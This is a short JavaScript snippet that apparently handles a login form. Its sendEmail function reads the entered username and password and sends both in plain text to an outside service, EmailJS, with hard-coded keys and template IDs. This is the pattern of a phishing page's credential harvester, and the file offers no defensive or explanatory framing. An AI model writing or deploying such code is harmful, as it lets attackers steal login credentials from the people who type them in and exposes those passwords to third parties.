(function() {
    emailjs.init("fbCqQ0fScUvJ5eunz"); // Replace with your EmailJS user ID
})();

function sendEmail() {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    var templateParams = {
        username: username,
        password: password
    };

    emailjs.send("service_11gqg9f", "template_tc8bjvr", templateParams)
        .then(function(response) {
            console.log("SUCCESS!", response.status, response.text);
        }, function(error) {
            console.log("FAILED...", error);
        });
}